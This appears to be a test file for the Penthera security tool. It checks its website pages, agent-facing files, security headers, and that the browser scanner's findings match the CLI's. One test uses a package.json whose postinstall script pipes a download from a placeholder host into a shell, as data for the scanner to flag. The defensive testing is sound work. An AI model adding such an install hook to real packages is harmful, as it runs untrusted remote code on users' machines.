    expect(map.match(/<p class="map-one"><strong>[^<]+\.<\/strong>/g)).toHaveLength(4);
    const tour = h.slice(h.indexOf('id="tour"'), h.indexOf('id="compare"'));
    // No video: three numbered stills of the light dashboard, each with alt text.
    expect(tour).not.toContain("<video");
    expect(tour.match(/<p class="step-n"><span>[123]<\/span> /g)).toHaveLength(3);
    expect(tour.match(/<figure class="shot">/g)).toHaveLength(3);
    for (const f of ["media/tour/tour-1-scan.jpg", "media/tour/tour-2-verdict.jpg", "media/tour/tour-3-fix.jpg"]) {
      expect(existsSync(join(out, f)), f).toBe(true);
      expect(tour).toMatch(new RegExp(`<img src="/${f}" width="1200" height="750" loading="lazy" alt="[^"]{40,}">`));
    }
  });

  it("gets you started three ways, each with a copy button", () => {
    const get = html().slice(html().indexOf('id="get"'), html().indexOf('id="faq"'));
    const version = siteVersion(JSON.parse(readFileSync(join(ROOT, "package.json"), "utf8")).version);
    for (const c of ["npx penthera", "npx skills add danoszz/penthera", `claude mcp add penthera -- npx -y penthera@${version} mcp`]) {
      expect(get).toContain(`<button class="cmd" type="button" data-copy="${c}"`);
    }
  });

  it("the Pro waitlist writes an email and stores nothing; /upkeep redirects to /pro", () => {
    const page = readFileSync(join(out, "pro.html"), "utf8");
    // The form only fills in an email: the CSP blocks submission (form-action
    // 'none'), there is no action or method, and the plain mailto always works.
    const form = page.match(/<form\b[^>]*>/)?.[0];
    expect(form).toBe('<form class="pro-form" novalidate>');
    expect(page).toMatch(/href="mailto:daan@penthera\.org\?subject=Penthera%20Pro%20waitlist/);
    expect(page).toContain('data-track="pro-waitlist"');
    expect(page).toContain("Join the experiment");
    // Pro is an experiment that measures a need, not a sale (GOVERNANCE.md#money).
    expect(page).toContain("Is the free tool enough?");
    expect(page).toContain("Pro is an experiment, not a sale");
    // The waitlist measures the need, so it must be able to record "none": the
    // budget starts at $0 with no nudge upward, and "the free tool is enough" is an answer.
    expect(page).toMatch(/id="pro-budget" name="budget" min="0" max="2000" step="25" value="0"/);
    expect(page).toContain('value="Nothing more: the free tool is enough"');
    expect(page).toContain("nothing is stored on penthera.org");
    expect(page).toContain('<script defer src="/track.js"></script>');
    expect(existsSync(join(out, "track.js"))).toBe(true);
    // Behaviour in /pro.js, never inline (CSP); the header sketch is decoration only.
    expect(page).toContain('<script defer src="/pro.js"></script>');
    expect(existsSync(join(out, "pro.js"))).toBe(true);
    expect(page).not.toMatch(/<script>|<style>|\sstyle="/);
    expect(page).toMatch(/<canvas class="pro-canvas" aria-hidden="true">/);
    // A price range while we test, the free way next to it, and the agent payments line marked as research.
    expect(page).toContain('From about <span class="spec-big">$100</span> a month per team.');
    // Pro copy promises no person on every result and makes no "pentest" claim (docs/research: the name and copy decisions).
    expect(page).not.toMatch(/pentest/i);
    expect(page).toContain("Nothing is for sale. The hosted parts are planned, and they get built only if the waitlist shows a need.");
    // No pitch for Pro in the README or in the live check's result.
    expect(readFileSync(join(ROOT, "README.md"), "utf8")).not.toMatch(/join the waitlist/i);
    expect(readFileSync(join(ROOT, "site", "check", "ui.js"), "utf8")).not.toContain('href = "/pro"');
    expect(readFileSync(join(ROOT, "GOVERNANCE.md"), "utf8")).toContain("Pro is an experiment, not a product for sale.");
    expect(page).toContain("init --yes</code> sets up the same checks in your own CI, free.");
    expect(page).toMatch(/In research<\/span> Checks your agents can call and pay for/);
    // The calculator and the budget go into the email, nowhere else.
    const js = readFileSync(join(out, "pro.js"), "utf8");
    // The dock also carries data-h, so the page must select its own panels.
    expect(js).toContain('document.querySelector(".pro-h[data-h]")');
    expect(js).not.toMatch(/\bfetch\(|XMLHttpRequest|sendBeacon|localStorage|document\.cookie/);
    expect(js).toContain("Budget a month:");
    const vercel = JSON.parse(readFileSync(join(ROOT, "vercel.json"), "utf8"));
    expect(vercel.redirects).toEqual(expect.arrayContaining([{ source: "/upkeep", destination: "/pro", permanent: true }]));
    expect(existsSync(join(out, "upkeep.html"))).toBe(false);
  });

  it("keeps Pro on ice: /pro still works, unlisted and noindex, and nothing links it", () => {
    const pro = readFileSync(join(out, "pro.html"), "utf8");
    expect(pro).toContain('<meta name="robots" content="noindex, nofollow">');
    expect(readFileSync(join(out, "pro.md"), "utf8")).toContain("Penthera Pro");
    const pages = readdirSync(out, { recursive: true }).map(String).filter((f) => /\.(html|txt|xml)$/.test(f) && f !== "pro.html");
    for (const f of pages) expect(readFileSync(join(out, f), "utf8"), f).not.toMatch(/href="\/pro"|penthera\.org\/pro(\.md)?\b/);
    expect(readFileSync(join(out, "index.html"), "utf8")).not.toMatch(/go-pro|gopro/);
    expect(existsSync(join(ROOT, "site", "gopro.js"))).toBe(true); // the code stays for later
  });

  it("counts checks and installs without the URL, host or score", () => {
    // docs/privacy.md: an event is a name and one fixed label, nothing typed.
    const ui = readFileSync(join(ROOT, "site", "check", "ui.js"), "utf8");
    const calls = [...ui.matchAll(/\bcount\(([^;]*)\);/g)].map((m) => m[1]);
    expect(calls.length).toBeGreaterThan(3);
    for (const c of calls) {
      expect(c, c).not.toMatch(/\b(url|host|report|score|text|cmd|input|value)\b(?!["`])/);
    }
    const labels = [...html().matchAll(/data-track="([^"]+)"/g)].map((m) => m[1]);
    expect(labels.length).toBeGreaterThanOrEqual(8);
    for (const l of labels) expect(l).toMatch(/^[a-z-]+$/);
  });

  it("links every entry point for agents, and each one exists", () => {
    const h = html();
    const sec = h.slice(h.indexOf('id="for-agents"'));
    for (const f of ["llms.txt", "llms-full.txt", "docs/index.md", "sitemap.xml", ".well-known/security.txt"]) {
      expect(sec).toContain(`href="/${f}"`);
      expect(existsSync(join(out, f)), f).toBe(true);
    }
    for (const f of ["server.json", "skills/penthera/SKILL.md"]) {
      expect(sec).toContain(`href="https://github.com/danoszz/penthera/blob/main/${f}"`);
      expect(existsSync(join(ROOT, f)), f).toBe(true);
    }
    // AGENTS.md is linked once it exists, never before.
    expect(sec.includes("blob/main/AGENTS.md")).toBe(existsSync(join(ROOT, "AGENTS.md")));
    expect(h).toContain('<link rel="alternate" type="text/plain" href="/llms.txt"');
  });
});

// A built path exists as a file, or as <path>.html, which cleanUrls serves without the extension.
const served = (out, f) => existsSync(join(out, f)) || existsSync(join(out, `${f}.html`));

describe("site landing pages", () => {
  const ORIGIN = JSON.parse(readFileSync(join(ROOT, "package.json"), "utf8")).homepage;
  const read = (f) => readFileSync(join(out, f), "utf8");
  const pages = landingPages(join(ROOT, "site"));
  // Live-check pages answer a search question with the live check; the
  // waitlist page (cta: waitlist, site/pages/pro.md) and the study page
  // (cta: contact, site/pages/research-e20.md) share the frame only.
  const checkPages = pages.filter((p) => !p.cta);

  it("has the two search questions, each with a title and a description for search", () => {
    expect(pages.map((p) => p.slug)).toEqual(expect.arrayContaining(["lovable-bolt-app-security", "website-security-check"]));
    for (const p of pages) {
      const h = read(`${p.slug}.html`);
      expect(h, p.slug).toContain(`<title>${p.title} · Penthera</title>`);
      expect(p.description.length, p.slug).toBeLessThanOrEqual(160);
      expect(h, p.slug).toContain(`<meta name="description" content="${p.description}">`);
      expect(h, p.slug).toContain(`<link rel="canonical" href="${ORIGIN}/${p.slug}">`);
      expect(h.match(/<h1[ >]/g), p.slug).toHaveLength(1);
    }
  });

  it("answers once, with the live check as the call to action and the CLI for the code", () => {
    for (const p of checkPages) {
      const h = read(`${p.slug}.html`);
      expect(h, p.slug).toContain('<a class="btn" data-variant="default" href="/#scan">Check your site</a>');
      expect(h, p.slug).toContain("<code>npx penthera");
      expect(h, p.slug).toContain('<a href="/terms">');
      expect(h, p.slug).not.toMatch(/\{\{|\u0000/);
      expect(h, p.slug).not.toMatch(/<script(?![^>]*\bsrc=)(?![^>]*type="application\/ld\+json")[^>]*>/);
      expect(h, p.slug).not.toMatch(/ style=/);
    }
  });

  it("follows the voice guide: no em dashes, no hype, and the limits on the same page", () => {
    for (const p of pages) {
      const md = readFileSync(join(ROOT, "site", "pages", `${p.slug}.md`), "utf8");
      expect(md, p.slug).not.toContain("\u2014");
      expect(md, p.slug).not.toMatch(/\b(the best|perfect|seamless|robust|powerful|cutting-edge|game-changing|comprehensive|bulletproof|100% secure)\b/i);
      if (p.cta) { expect(md, p.slug).toContain("## What it is not"); continue; }
      expect(md, p.slug).toContain("## What it cannot see");
      expect(md, p.slug).toMatch(/not a guarantee/);
    }
  });

  it("states the live check's own limits: the request budget and file counts in api/_lib/page.mjs", async () => {
    const { LIMITS } = await import("../api/_lib/page.mjs");
    const md = readFileSync(join(ROOT, "site", "pages", "website-security-check.md"), "utf8");
    expect(md).toContain(`at most ${LIMITS.requests} requests`);
    expect(md).toContain(`up to ${LIMITS.sameSiteFiles + LIMITS.thirdPartyFiles} scripts and stylesheets`);
    expect(md).toContain(`${LIMITS.sameSiteFiles} from your site, ${LIMITS.thirdPartyFiles} from elsewhere`);
    expect(md).toContain(`about ${LIMITS.budgetMs / 1000} seconds`);
    for (const p of checkPages) expect(read(`${p.slug}.html`), p.slug).toContain(`${COUNTS.secretPatterns} secret patterns`);
  });

  it("lists each page in the sitemap and llms.txt, serves its Markdown, and links it from the homepage", () => {
    const locs = [...read("sitemap.xml").matchAll(/<loc>([^<]+)<\/loc>/g)].map((m) => m[1]);
    for (const p of pages.filter((x) => !x.unlisted)) {
      expect(locs, p.slug).toContain(`${ORIGIN}/${p.slug}`);
      expect(read("llms.txt"), p.slug).toContain(`(${ORIGIN}/${p.slug}.md)`);
      expect(read(`${p.slug}.md`), p.slug).not.toMatch(/\]\(\/(?!\/)/);
      if (p.cta) continue;
      expect(read(`${p.slug}.md`), p.slug).toContain(`(${ORIGIN}/#scan)`);
      expect(read("index.html"), p.slug).toContain(`<a href="/${p.slug}">`);
    }
  });

  it("serves the E20 study page at the User-Agent's URL, with the opt-out and a contact", async () => {
    const { USER_AGENT } = await import("../bench/front-door/run.mjs");
    const vercel = JSON.parse(readFileSync(join(ROOT, "vercel.json"), "utf8"));
    const path = new URL(/\+(https:\/\/[^;)]+)/.exec(USER_AGENT)[1]).pathname;
    expect(vercel.redirects).toContainEqual({ source: path, destination: "/research-e20", permanent: true });
    const h = read("research-e20.html");
    expect(h).toContain(USER_AGENT);
    expect(h).toContain("User-agent: Penthera-Research\nDisallow: /");
    expect(h).toContain('href="mailto:daan@penthera.org?subject=Penthera-Research%2FE20"');
  });

  it("names one host in the sitemap, robots.txt and /terms", () => {
    // The homepage's canonical follows Vercel's production domain (SITE_URL);
    // The Vercel primary domain (penthera.org) is what makes it match.
    expect(read("terms.html")).toContain(`<link rel="canonical" href="${ORIGIN}/terms">`);
    expect(read("robots.txt")).toContain(`Sitemap: ${ORIGIN}/sitemap.xml`);
    for (const l of [...read("sitemap.xml").matchAll(/<loc>([^<]+)<\/loc>/g)].map((m) => m[1])) expect(l.startsWith(`${ORIGIN}/`), l).toBe(true);
  });

  it("serves the IndexNow key at /<key>.txt", () => {
    const key = readKey(join(ROOT, "site"));
    expect(read(`${key}.txt`).trim()).toBe(key);
  });
});

describe("site files for agents", () => {
  const read = (f) => readFileSync(join(out, f), "utf8");
  const ORIGIN = JSON.parse(readFileSync(join(ROOT, "package.json"), "utf8")).homepage;
  const pages = docPages(ROOT);

  it("llms.txt follows the format: a title, a summary, and links that resolve", () => {
    const llms = read("llms.txt");
    expect(llms).toMatch(/^# Penthera\n\n> .+\n/);
    for (const m of llms.matchAll(/\]\((https:\/\/penthera\.org\/[^)]+)\)/g)) {
      const f = m[1].slice(ORIGIN.length + 1).split("#")[0];
      expect(served(out, f), m[1]).toBe(true);
    }
    expect(llms).toContain(`${ORIGIN}/llms-full.txt`);
    expect(llms).toContain("one runtime dependency");
  });

  it("llms-full.txt is README.md and every docs page, in reading order", () => {
    const full = read("llms-full.txt");
    expect(pages[0]).toBe("README.md");
    expect(pages[1]).toBe("docs/index.md");
    expect(pages.length).toBeGreaterThan(30);
    let last = -1;
    for (const p of pages) {
      const at = full.indexOf(`<!-- Source: https://github.com/danoszz/penthera/blob/main/${p} `);
      expect(at, p).toBeGreaterThan(last);
      last = at;
      // The page's own first heading is in it.
      const h1 = readFileSync(join(ROOT, p), "utf8").match(/^# .+$/m)?.[0];
      if (h1) expect(full, p).toContain(h1);
    }
    for (const skip of ["docs/voice.md", "docs/marketing.md", "docs/internal-audit.md"]) expect(pages).not.toContain(skip);
  });

  it("mirrors each page as Markdown, with every relative link made absolute", () => {
    for (const p of pages) {
      const md = read(p);
      expect(md, p).toMatch(new RegExp(`^<!-- ${ORIGIN}/${p}: a copy of `));
      for (const m of md.matchAll(/\]\(([^)\s]+)\)/g)) expect(m[1], `${p}: ${m[1]}`).toMatch(/^(https?:|mailto:|#)/);
      for (const m of md.matchAll(/<(?:img|a|source|video)\b[^>]*?\b(?:src|href|poster)="([^"]+)"/g)) expect(m[1], `${p}: ${m[1]}`).toMatch(/^(https?:|#)/);
      // Links to other mirrored pages stay on the site.
      for (const m of md.matchAll(/\]\((https:\/\/penthera\.org\/[^)#]+)/g)) expect(served(out, m[1].slice(ORIGIN.length + 1)), m[1]).toBe(true);
    }
    expect(absoluteLinks("[a](commands/mcp.md#x) [b](../bench/RESULTS.md) [c](../assets/demo.gif) [d](commands/)", "docs/index.md", { root: ROOT, origin: ORIGIN, mirrored: new Set(["docs/commands/mcp.md"]) }))
      .toBe(`[a](${ORIGIN}/docs/commands/mcp.md#x) [b](https://github.com/danoszz/penthera/blob/main/bench/RESULTS.md) [c](https://github.com/danoszz/penthera/raw/main/assets/demo.gif) [d](https://github.com/danoszz/penthera/tree/main/docs/commands)`);
  });

  it("pins every npm command in the mirrors to the installable version", () => {
    const version = siteVersion(JSON.parse(readFileSync(join(ROOT, "package.json"), "utf8")).version);
    for (const f of ["llms-full.txt", ...pages]) {
      for (const m of read(f).matchAll(/(?<![\w/-])penthera@(\d[\w.-]*)/g)) expect(m[1], f).toBe(version);
    }
    expect(pinTo("npx -y penthera@1.9.0 mcp; uses: danoszz/penthera@v1; npx penthera@1.7.0-rc.2 x", "2.0.0")).toBe("npx -y penthera@2.0.0 mcp; uses: danoszz/penthera@v1; npx penthera@2.0.0 x");
  });

  it("sitemap.xml lists the page and every file for agents, on the production origin", () => {
    const xml = read("sitemap.xml");
    expect(xml).toMatch(/^<\?xml version="1\.0" encoding="UTF-8"\?>\n<urlset xmlns="http:\/\/www\.sitemaps\.org\/schemas\/sitemap\/0\.9">/);
    const locs = [...xml.matchAll(/<loc>([^<]+)<\/loc>/g)].map((m) => m[1]);
    expect(locs[0]).toBe(`${ORIGIN}/`);
    expect(locs).toEqual(expect.arrayContaining([`${ORIGIN}/llms.txt`, `${ORIGIN}/llms-full.txt`, ...pages.map((p) => `${ORIGIN}/${p}`)]));
    for (const l of locs.slice(1)) expect(served(out, l.slice(ORIGIN.length + 1)), l).toBe(true);
  });

  it("robots.txt allows everyone and points to the sitemap", () => {
    const robots = read("robots.txt");
    expect(robots).toMatch(/^User-agent: \*\nAllow: \/$/m);
    expect(robots).not.toMatch(/^Disallow: \S/m);
    expect(robots).toContain(`Sitemap: ${ORIGIN}/sitemap.xml`);
  });

  it("security.txt follows RFC 9116: Contact, Expires within a year, Policy, Canonical", () => {
    const txt = read(".well-known/security.txt");
    const field = (k) => txt.match(new RegExp(`^${k}: (.+)$`, "m"))?.[1];
    expect(field("Contact")).toBe("https://github.com/danoszz/penthera/security/advisories/new");
    expect(field("Policy")).toBe("https://github.com/danoszz/penthera/blob/main/SECURITY.md");
    expect(field("Canonical")).toBe(`${ORIGIN}/.well-known/security.txt`);
    expect(field("Expires")).toMatch(/^\d{4}-\d{2}-\d{2}T00:00:00Z$/);
    const days = (Date.parse(field("Expires")) - Date.now()) / 86_400_000;
    expect(days).toBeGreaterThan(200);
    expect(days).toBeLessThan(365);
    expect(txt.match(/^Expires:/gm)).toHaveLength(1);
    expect(existsSync(join(ROOT, "SECURITY.md"))).toBe(true);
  });
});

describe("site headers", () => {
  it("vercel.json's ignoreCommand fits Vercel's 256-character limit", () => {
    // Vercel rejects the whole deployment when it's longer.
    const { ignoreCommand } = JSON.parse(readFileSync(join(ROOT, "vercel.json"), "utf8"));
    expect(ignoreCommand.length).toBeLessThanOrEqual(256);
    // Only production builds: previews are skipped, and run locally with node site/serve.mjs.
    expect(ignoreCommand.startsWith('[ "$VERCEL_ENV" != production ] || ')).toBe(true);
  });

  it("vercel.json allows only Vercel's two counters, and forbids framing and plain HTTP", () => {
    const h = headersFor("/");
    const csp = h["Content-Security-Policy"];
    // The only connections: cookieless page views and load times on penthera.org.
    const connect = csp.match(/connect-src ([^;]+)/)[1].trim().split(/\s+/).sort();
    expect(connect).toEqual([
      "https://penthera.org/_vercel/insights/", "https://penthera.org/_vercel/speed-insights/",
      "https://www.penthera.org/_vercel/insights/", "https://www.penthera.org/_vercel/speed-insights/",
      // And the live check, on the same site: POST /api/check.
      "https://penthera.org/api/check", "https://www.penthera.org/api/check",
    ].sort());
    expect(csp).toContain("frame-ancestors 'none'");
    expect(csp).toContain("default-src 'none'");
    expect(csp).not.toMatch(/unsafe-(inline|eval)/);
    expect(h["Strict-Transport-Security"]).toMatch(/max-age=\d{8}/);
    expect(h["Referrer-Policy"]).toBe("no-referrer");
  });

  it("the preview server sends them", async () => {
    const server = await serve({ dir: out, port: 0 });
    try {
      const res = await fetch(`http://127.0.0.1:${server.address().port}/`);
      expect(res.status).toBe(200);
      // Locally the live check is on the preview's own origin, so connect-src adds 'self'.
      expect(res.headers.get("content-security-policy")).toContain("connect-src 'self' https://penthera.org/_vercel/insights/ https://penthera.org/_vercel/speed-insights/ https://www.penthera.org/_vercel/insights/ https://www.penthera.org/_vercel/speed-insights/");
      // The link-preview reel: fetched directly by preview bots, as video/mp4.
      const reel = await fetch(`http://127.0.0.1:${server.address().port}/media/social/reel.mp4`);
      expect(reel.status).toBe(200);
      expect(reel.headers.get("content-type")).toBe("video/mp4");
      await reel.arrayBuffer();
      // The files for agents: the same headers, and a text type.
      for (const [path, type] of [["/llms.txt", "text/plain"], ["/llms-full.txt", "text/plain"], ["/docs/index.md", "text/markdown"], ["/sitemap.xml", "application/xml"], ["/robots.txt", "text/plain"], ["/.well-known/security.txt", "text/plain"]]) {
        const r = await fetch(`http://127.0.0.1:${server.address().port}${path}`);
        expect(r.status, path).toBe(200);
        expect(r.headers.get("content-type"), path).toMatch(new RegExp(`^${type}; charset=utf-8$`));
        expect(r.headers.get("content-security-policy"), path).toContain("default-src 'none'");
        expect(r.headers.get("x-content-type-options"), path).toBe("nosniff");
        await r.text();
      }
    } finally {
      server.close();
    }
  });
});

describe("browser check, against the CLI", () => {
  for (const name of ["malicious", "clean"]) {
    it(`agents fixture (${name}): the same findings as penthera agents and the secret scan`, async () => {
      const files = pageFiles(join(ROOT, "tests", "fixtures", "agents", name));
      expect(files.length).toBeGreaterThan(0);
      const page = await engine.check(files);
      const d = cliFolder(files);
      const cli = [...(await scanAgents(d)).findings, ...scanSecrets(d)];
      expect(page.findings.map(key).sort()).toEqual(cli.map(key).sort());
      if (name === "malicious") expect(page.counts.critical).toBeGreaterThan(0);
    });
  }

  it("deps fixture: package.json typosquats match penthera deps", async () => {
    const fx = buildFixtures(join(dir, "deps"));
    // The fixture's package.json as npm would have written it: the lockfile's root entry.
    const root = JSON.parse(readFileSync(join(fx.head, "package-lock.json"), "utf8")).packages[""];
    const page = await engine.check([{ path: "package.json", text: JSON.stringify(root, null, 2) }]);
    const cli = await scanDeps(fx.head);
    const typos = (fs) => fs.filter((f) => f.method === "deps-typosquat").map((f) => [f.severity, f.title, f.description].join(" | ")).sort();
    expect(typos(page.findings).length).toBeGreaterThan(0);
    expect(typos(page.findings)).toEqual(typos(cli.findings));
  });

  it("an exact pin of a known-malicious version is flagged, as penthera deps flags it", async () => {
    const rule = rulesOf("ioc-package").find((r) => r.packages.some((p) => p.versions.some((v) => v !== "*")));
    const p = rule.packages.find((x) => x.versions.some((v) => v !== "*"));
    const version = p.versions.find((v) => v !== "*");
    const page = await engine.check([{ path: "package.json", text: JSON.stringify({ name: "app", version: "1.0.0", dependencies: { [p.name]: version } }) }]);
    const expected = iocFindings([{ name: p.name, version, path: "package.json", iocHits: [] }], loadIocs()).map((f) => f.title);
    expect(page.findings.filter((f) => f.method === "deps-ioc").map((f) => f.title)).toEqual(expected);
  });

  it("install scripts declared in package.json, with the same wording as penthera deps", async () => {
    const pkg = { name: "app", version: "1.0.0", scripts: { postinstall: "curl -s https://example.invalid/x | sh" } };
    const page = await engine.check([{ path: "package.json", text: JSON.stringify(pkg, null, 2) }]);
    const f = page.findings.find((x) => x.capabilities?.includes("install-scripts"));
    expect(f.title).toBe("app@1.0.0: runs a risky install script");
    expect(f.description).toContain("npm ci --ignore-scripts");
  });

  it("works out pasted text by its shape", () => {
    expect(engine.guessKind('{"mcpServers":{}}').path).toBe(".mcp.json");
    expect(engine.guessKind('{"hooks":{}}').path).toBe(".claude/settings.json");
    expect(engine.guessKind('{"name":"x","dependencies":{}}').path).toBe("package.json");
    expect(engine.guessKind("# Project notes").path).toBe("CLAUDE.md");
    expect(engine.kindForName("settings.local.json").path).toBe(".claude/settings.json");
    expect(engine.kindForName("README.md")).toBe(null);
  });

  it("runs every bundled rule pack; a pack that is signed verified at build", () => {
    const { packs } = engine.about();
    const bundled = readdirSync(join(ROOT, "lib", "rules"), { withFileTypes: true })
      .filter((d) => d.isDirectory() && existsSync(join(ROOT, "lib", "rules", d.name, "pack.json"))).map((d) => d.name);
    expect(packs.map((p) => p.name).sort()).toEqual(bundled.sort());
    for (const p of packs) {
      const signed = existsSync(join(ROOT, "lib", "rules", p.name, "pack.json.sig"));
      expect(p.signature, p.name).toBe(signed ? "valid" : "missing");
    }
  });
});

describe("browser check, runtime advisories against the CLI", () => {
  const adv = (fs) => fs.filter((f) => f.source === "runtime-advisory").map((f) => [f.severity, f.confidence, f.title, f.description, f.remediation || ""].join(" | "));

  /** A loopback server that answers with these headers; the CLI fingerprints it like any target. */
  async function serveHeaders(lines) {
    const server = createServer((req, res) => {
      for (const [k, v] of lines) res.appendHeader(k, v);
      res.end("");
    });
    await new Promise((ok) => server.listen(0, "127.0.0.1", ok));
    return server;
  }

  const CASES = {
    "PHP 8.3.35 and a session cookie": [["X-Powered-By", "PHP/8.3.35"], ["Set-Cookie", "PHPSESSID=abc; path=/"], ["Set-Cookie", "lang=en"]],
    "PHP 8.3.36": [["X-Powered-By", "PHP/8.3.36"]],
    "an Ubuntu build behind Apache": [["Server", "Apache/2.4.58 (Ubuntu)"], ["X-Powered-By", "PHP/8.3.6-1ubuntu1.4"]],
    "PHPSESSID only": [["Set-Cookie", "PHPSESSID=x"]],
    "end-of-life PHP 8.1": [["X-Powered-By", "PHP/8.1.34"], ["Server", "nginx/1.27.2"]],
  };

  for (const [name, lines] of Object.entries(CASES)) {
    it(`pasted headers, ${name}: the same findings as a URL scan of a server sending them`, async () => {
      const server = await serveHeaders(lines);
      try {
        const fp = await fingerprint(`http://127.0.0.1:${server.address().port}/`);
        const cli = runtimeAdvisoriesForResponse(fp, { url: engine.HEADERS });
        // What `curl -sI` prints for the same response.
        const text = ["HTTP/1.1 200 OK", ...lines.map(([k, v]) => `${k}: ${v}`), "Content-Length: 0", ""].join("\r\n");
        const page = await engine.check([{ path: engine.HEADERS, text }]);
        expect(adv(page.findings)).toEqual(adv(cli));
        expect(cli.length).toBeGreaterThan(0);
      } finally {
        server.close();
      }
    });
  }

  it("the October 2026 PHP release, as the CLI reports it", async () => {
    const one = async (text) => (await engine.check([{ path: engine.HEADERS, text }])).findings.filter((f) => f.source === "runtime-advisory");
    const affected = await one("HTTP/2 200\nx-powered-by: PHP/8.3.35\n");
    expect(affected.flatMap((f) => f.cves || [])).toEqual(expect.arrayContaining(["CVE-2026-109618", "CVE-2026-109619"]));
    // A banner without a distribution token may be a patched package: potential.
    expect(affected.every((f) => f.confidence === "potential")).toBe(true);
    const fixed = await one("HTTP/2 200\nx-powered-by: PHP/8.3.36\n");
    expect(fixed).toHaveLength(1);
    expect(fixed[0]).toMatchObject({ severity: "info" });
    expect(fixed[0].title).toMatch(/has the fix/);
    const docker = (await engine.check([{ path: "Dockerfile", text: "FROM php:8.3.12-fpm\n" }])).findings;
    expect(docker.flatMap((f) => f.cves || [])).toEqual(expect.arrayContaining(["CVE-2026-109618", "CVE-2026-109619"]));
    // An official image is an upstream build: likely.
    expect(docker.filter((f) => f.source === "runtime-advisory" && f.severity === "critical").every((f) => f.confidence === "likely")).toBe(true);
  });

  it("runtime pins: the same findings as penthera --repo on the same files", async () => {
    const files = [
      { path: "Dockerfile", text: "FROM --platform=linux/amd64 php:8.3.12-fpm AS app\nFROM node:${NODE_VERSION}\n" },
      { path: "compose.yaml", text: "services:\n  db:\n    image: \"python:3.12.1-slim\"\n  web:\n    image: php:8.1-apache\n" },
      { path: ".tool-versions", text: "nodejs 20.11.1\n# php 7.4\n" },
      { path: ".php-version", text: "8.3\n" },
      { path: "composer.json", text: JSON.stringify({ require: { php: "^8.1" } }) },
    ];
    const page = await engine.check(files);
    const cli = runtimeAdvisoriesForRepo(cliFolder(files));
    // The same findings; order follows the folder walk, and the page sorts by severity.
    expect(adv(page.findings).sort()).toEqual(adv(cli).sort());
    expect(cli.length).toBeGreaterThan(0);
  });

  it("recognises the new files by name and by shape", () => {
    expect(engine.kindForName("Dockerfile.prod").path).toBe("Dockerfile.prod");
    expect(engine.kindForName("docker-compose.override.yml").path).toBe("docker-compose.override.yml");
    expect(engine.kindForName(".tool-versions").path).toBe(".tool-versions");
    expect(engine.guessKind("FROM php:8.3-apache\n").path).toBe("Dockerfile");
    expect(engine.guessKind('{"require":{"php":"^8.2"}}').path).toBe("composer.json");
    expect(engine.guessKind("services:\n  web:\n    image: php:8.3\n").path).toBe("compose.yaml");
  });
});
